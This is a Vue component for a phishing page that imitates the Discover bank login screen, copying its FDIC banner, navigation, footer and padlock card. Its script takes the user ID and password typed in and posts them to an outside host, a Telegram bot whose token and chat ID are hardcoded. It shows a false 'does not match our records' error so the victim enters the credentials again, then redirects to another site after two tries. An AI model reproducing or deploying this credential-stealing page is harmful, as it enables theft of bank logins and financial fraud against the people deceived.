<template>
  <div id="app">
    <body>

   <header class="fdic-bar">
    <span><img class="image-container" src="../src/assets/images/fdic-dark-logo.svg" alt="FDIC logo" width="38px" height="16px"> 
        FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
</header>

<nav class="main-nav">
    <div class="nav-left">
        <!-- <div class="logo">YOURLOGO</div> -->
         <img alt="logo" class="logo" src="../src/assets/images/discover-logo.svg" width="113px" height="22px"/>

        <div class="all-products">
            All Products ▾
        </div>
    </div>

    <div class="nav-right">
        <a href="#" class="nav-link">
           <span class="icon question-icon">?</span>
            Help and Resources
        </a>

        <a href="#" class="nav-link">
           <span class="scope">&#128269;</span>
            Search
        </a>

        <button class="login-btnn">Log In</button>
    </div>
</nav>

 

    <div class="login-wrapper">
    <div class="login-card">

        <div class="login-header">
            <!-- <svg class="lock-icon" viewBox="0 0 24 24">
                <path d="M12 1C9.24 1 7 3.24 7 6v3H6a2 2 0 0 0-2 2v9a2 
                2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 
                2 0 0 0-2-2h-1V6c0-2.76-2.24-5-5-5zm-3 
                8V6a3 3 0 1 1 6 0v3H9zm3 
                4a2 2 0 1 0 0 4 2 2 0 0 0 0-4z"/>
            </svg> -->
    <svg class="lock-icon css-9uy14h" xmlns="http://www.w3.org/2000/svg"
       fill="none"
       viewBox="0 0 60 60"
       aria-hidden="true"
       aria-label="Secure Access Symbol"
       data-testid="dfs-react-ui__icon--lock-secondary"
       >

    <path fill="#23233F" fill-rule="evenodd"
      d="M45.99 16.268C45.81 7.253 38.495 0 29.5 0c-9.109 0-16.493 7.435-16.493 16.607v3.134H4v14.952C4 48.677 15.422 60 29.5 60l.408-.003C43.818 59.773 55 48.507 55 34.677V19.74h-9.007v-3.134l-.004-.339Zm-3.19 3.473v-3.134c0-7.397-5.954-13.393-13.3-13.393-7.236 0-13.123 5.819-13.297 13.063l-.004.33v3.134h26.602ZM7.192 22.954h44.617v11.723c0 12.064-9.773 21.91-21.938 22.106l-.383.003-.372-.003c-12.141-.197-21.923-10.016-21.923-22.09V22.954Z"
      clip-rule="evenodd">
    </path>

    <path fill="#EA6A28" fill-rule="evenodd"
      d="M29.504 31.072c-2.938 0-5.32 2.399-5.32 5.357a5.355 5.355 0 0 0 3.724 5.112v6.138l.007.155a1.6 1.6 0 0 0 1.589 1.453c.881 0 1.596-.72 1.596-1.608v-6.138a5.355 5.355 0 0 0 3.724-5.112c0-2.958-2.382-5.357-5.32-5.357Zm0 3.215c1.175 0 2.128.959 2.128 2.142a2.136 2.136 0 0 1-2.128 2.143 2.136 2.136 0 0 1-2.128-2.143c0-1.183.952-2.142 2.128-2.142Z"
      clip-rule="evenodd">
    </path>

  </svg>
            <h4>Secure Account Login</h4>
</div>

<!-- error side -->

<div class="error-alert">
  <div class="error-bar"></div>

  <div class="error-content">
    <!-- <div class="error-icon">!</div> -->

    <div class="error-text" v-if="isActive">
      Sorry. The User ID and/or Password does not match our records, 
      or you are not registered. Please try again.
    </div>
  </div>

  <!-- <button class="error-close">&times;</button> -->
</div>


        <form>
            <input type="text" placeholder="User ID" v-model="formDataRes.userid">
            <input type="password" placeholder="Password" v-model="formDataRes.password">

            <button class="login-btn" @click.prevent="finishJoob();">Log In</button>

            <div class="login-links">
                <a href="#">Forgot User ID/Password</a>
                <a href="#">Register Account</a>
            </div>

            <div class="divider"></div>

            <p class="home-loans">
                Log into <a href="#">Discover Home Loans</a>
            </p>
        </form>

    </div>
</div>

<footer class="footer">
  <div class="footer-container">

    <!-- Row 1 -->
    <div class="footer-grid">

      <div class="footer-column">
        <h4>Credit Card Quick Links</h4>
        <a href="#">All Credit Cards</a>
        <a href="#">See if you're prequalified</a>
        <a href="#">Respond to Mail Offer</a>
        <a href="#">Check Application Status</a>
        <a href="#">Cardmember Agreement</a>
        <a href="#">Credit Card Benefits</a>
        <a href="#">ATM Locator</a>
      </div>

      <div class="footer-column">
        <h4>Credit Card Categories</h4>
        <a href="#">Cash Back Credit Cards</a>
        <a href="#">Student Credit Cards</a>
        <a href="#">Secured Credit Card</a>
        <a href="#">Travel Credit Card</a>
        <a href="#">Compare Credit Cards</a>
        <a href="#">Gas Credit Cards</a>
      </div>

      <div class="footer-column">
        <h4>Credit Card Features</h4>
        <a href="#">Balance Transfer Credit Cards</a>
        <a href="#">Credit Cards to Build Credit</a>
        <a href="#">No Annual Fee Credit Cards</a>
        <a href="#">Intro APR Credit Cards</a>
        <a href="#">Credit Cards for No Credit</a>
        <a href="#">Instant Use Credit Cards</a>
      </div>

      <div class="footer-column">
        <h4>Card Smarts & More</h4>
        <a href="#">Card Smarts</a>
        <a href="#">Getting a Credit Card</a>
        <a href="#">Using a Credit Card</a>
        <a href="#">Credit Card Rewards</a>
        <a href="#">Credit Card Interest Calculator</a>
        <a href="#">Balance Transfer Calculator</a>
      </div>

      <!-- Social & App -->
      <div class="footer-column social-column">
        <div class="social-icons">
          <a href="#"><img src="../src/assets/images/icon-footer-x.webp" alt="X"></a>
          <a href="#"><img src="../src/assets/images/icon-footer-fb.png" alt="Facebook"></a>
          <a href="#"><img src="../src/assets/images/icon-footer-instagram.webp" alt="Instagram"></a>
          <a href="#"><img src="../src/assets/images/icon-footer-linkedin.png" alt="LinkedIn"></a>
        </div>
        <div class="app-badge">
          <!-- <img src="../src/assets/images/icon-footer-mobileapp.webp" alt="Discover Mobile App" > -->
        </div>
      </div>

    </div>

    <!-- Row 2 -->
    <div class="footer-grid second-row">

      <div class="footer-column">
        <h4>Rewards</h4>
        <a href="#">Rewards Credit Cards</a>
        <a href="#">Cash Back Rewards</a>
        <a href="#">5% Cashback Bonus®</a>
        <a href="#">Redeem Cashback Bonus</a>
        <a href="#">Refer a Friend</a>
      </div>

      <div class="footer-column">
        <h4>More Discover Products</h4>
        <a href="#">Banking</a>
        <a href="#">Home Equity Loans</a>
        <a href="#">Mortgage Refinance</a>
        <a href="#">Personal Loans</a>
        <a href="#">Debt Consolidation</a>
        <a href="#">Identity Theft Protection</a>
      </div>

      <div class="footer-column">
        <h4>Quick Links</h4>
        <a href="#">Sitemap</a>
        <a href="#">Terms of Use</a>
        <a href="#">Accessibility</a>
        <a href="#">Browser Support</a>
        <a href="#">Your California Privacy Choices</a>
        <a href="#">AdChoices</a>
        <a href="#">Discover® Scholarship Sweepstakes</a>
      </div>

      <div class="footer-column">
        <h4>About Us</h4>
        <a href="#">Contact Us</a>
        <a href="#">About Discover</a>
        <a href="#">Corporate Impact</a>
        <a href="#">Investor Relations</a>
        <a href="#">Newsroom</a>
        <a href="#">Careers</a>
        <a href="#">Accept Discover</a>
        <a href="#">Inclusion and Belonging</a>
      </div>

    </div>

    <!-- Bottom Bar -->
    <div class="footer-bottom">
      <div class="footer-logos">
        <img src="../src/assets/images/icon-footer-equal-housing-lender-70x55.svg" alt="Equal Housing Lender">
        <img src="../src/assets/images/icon-footer-BBB-70x55.svg" alt="BBB Accredited">
        <img src="../src/assets/images/icon-footer-fdic-70x55.svg" alt="Member FDIC">
      </div>
      <div class="copyright">
        ©2026 Discover, a division of Capital One, N.A., Member FDIC
      </div>
    </div>

  </div>
</footer>

</body>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        userid: "",
        password: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 2, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ DisCv*\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://mata-verify.vercel.app/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>



<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
}

body {
    background-color: white;
}

/* Header */
.top-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px 40px;
    background: white;
    border-bottom: 1px solid #ddd;
}

.logo {
    font-size: 22px;
    font-weight: bold;
}

.nav a {
    margin-right: 20px;
    text-decoration: none;
    color: #333;
    font-size: 14px;
}

.login-btn {
    background: #f37021;
    color: white;
    border: none;
    padding: 8px 18px;
    border-radius: 20px;
    cursor: pointer;
}
.login-btnn {
 
    display: inline-block;
    line-height: 20px;
    padding: 9px;
    text-align: center;
    margin: 14px 0 13px 19px;
    background: #ea6a28;
    color: #fff;
    width: 85px;
    border-radius: 20px;
    font-family: var(--DiscoverSans-Bold);
    font-size: 19px;
    font-weight: 700;
    max-width: 264px;
    border: none;

}

body {
    margin: 0;
    font-family: "Segoe UI", Arial, sans-serif;
    background: #f7f7f7;
}

/* Center wrapper */
.login-wrapper {
    display: flex;
    justify-content: center;
    padding: 15px 20px;
}

/* Card */
.login-card {
    width: 420px;
    background: white;
    border-radius: 16px;
    padding: 40px;
    box-shadow: 0 6px 18px rgba(0,0,0,0.12);
}

/* Header */
.login-header {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 30px;
}

.login-header h2 {
    font-size: 20px;
    font-weight: 600;
    margin: 0;
}

/* Padlock icon */
.lock-icon {
    width: 22px;
    height: 22px;
    fill: #2c3e50;
}

/* Inputs */
form input {
    width: 100%;
    padding: 16px;
    margin-bottom: 18px;
    border-radius: 12px;
    border: 1px solid #cfd3d8;
    background: white;
    font-size: 14px;
}

form input:focus {
    outline: none;
    border-color: black;
}

/* Login Button */
.login-btn {
    width: 100%;
    padding: 16px;
    background: #f37021;
    color: white;
    border: none;
    border-radius: 28px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 5px;
}

.login-btn:hover {
    background: #d85f18;
}

/* Links */
.login-links {
    text-align: center;
    margin-top: 18px;
}

.login-links a {
    display: block;
    font-size: 14px;
    color: #1f5fbf;
    text-decoration: none;
    margin: 6px 0;
}

/* Divider */
.divider {
    height: 1px;
    background: #ddd;
    margin: 25px 0;
}

/* Bottom text */
.home-loans {
    text-align: center;
    font-size: 14px;
}

.home-loans a {
    color: #1f5fbf;
    text-decoration: none;
}




/* FDIC Top Strip */
.fdic-bar {
    background: #f2f2f2;
    text-align: center;
    font-size: 12px;
    padding: 6px 0;
    border-bottom: 1px solid black;
}

/* Main Navbar */
.main-nav {
    display: flex;
    justify-content: space-around;
    align-items: center;
    padding: 14px 60px;
    background: #f8f8f8;
    border-bottom: 1px solid #e5e5e5;
}

/* Left Side */
.nav-left {
    display: flex;
    align-items: center;
    gap: 40px;
}

.logo {
    font-size: 26px;
    font-weight: bold;
    letter-spacing: 1px;
}

/* All Products Box */
.all-products {
    padding: 14px 20px;
    font-size: 19px;
    /* border: 2px solid #3b5aa3; */
    border-radius: 4px;
    font-weight: 600;
    cursor: pointer;
}

/* Right Side */
.nav-right {
    display: flex;
    align-items: center;   /* keeps everything vertically centered */
    gap: 30px;
}

.nav-link {
    text-decoration: none;
    color: #333;
    font-size: 15px;
    display: flex;
    flex-direction: column;   /* 👈 stack icon above text */
    align-items: center;      /* 👈 center icon + text */
    gap: 4px;                 /* space between icon and text */
}


.icon {
    font-size: 14px;
    background: #f0f0f0;
    border-radius: 50%;
    width: 22px;
    height: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
}

/* Login Button */
.login-btn {
    background: #f37021;
    color: white;
    border: none;
    padding: 10px 22px;
    border-radius: 24px;
    font-weight: 600;
    cursor: pointer;
}

.login-btn:hover {
    background: #d85f18;
}

.footer {
  background: #f2f2f2;
  padding: 60px 0 30px;
  font-family: Arial, sans-serif;

  /* subtle top separation */
  box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.04);
}
.footer-container {
  width: 90%;
  max-width: 1000px;
  margin: auto;
}

.footer-grid {
  display: grid;
  grid-template-columns: repeat(5, 1fr);
  gap: 40px;
  margin-bottom: 50px;
}

.footer-grid.second-row {
  grid-template-columns: repeat(4, 1fr);
}

.footer-column h4 {
  font-size: 14px;
  font-weight: 600;
  margin-bottom: 15px;
  color: #333;
}

.footer-column a {
  display: block;
  color: #3a73b8;
  text-decoration: none;
  font-size: 14px;
  margin-bottom: 10px;
}

.footer-column a:hover {
  text-decoration: underline;
}

.social-column {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
}

.social-icons {
  display: grid;
  grid-template-columns: repeat(2, 40px);
  gap: 15px;
  margin-bottom: 20px;
}

.social-icons img {
  width: 40px;
  height: 40px;
}

.app-badge img {
  width: 150px;
}

.footer-bottom {
  border-top: 1px solid #ddd;
  padding-top: 20px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
}

.footer-logos img {
  height: 40px;
  margin-right: 20px;
}

.copyright {
  font-size: 13px;
  color: #666;
}

.icon-container {
    width: 120px;
    height: 120px;
  }

  .css-9uy14h {
    width: 25px;
    height: 25px;
    display: block;
  }

  /* Optional hover effect */
  .css-9uy14h:hover {
    transform: scale(1.05);
    transition: transform 0.2s ease-in-out;
  }

  .scope {
    font-size: 18px;
    color: #000;
    font-family: "Segoe UI Symbol", "Arial Unicode MS", sans-serif;
}

.question-icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;

    width: 20px;
    height: 20px;

    background-color: #000;  /* black background */
    color: #fff;             /* white ? */

    font-size: 14px;
    font-weight: bold;

    border-radius: 50%;      /* makes it a circle */
}


/* body {
  background-color: #f4f4f4;
  font-family: Arial, sans-serif;
} */

.error-text{
    color: rgb(228, 55, 55);
}

</style>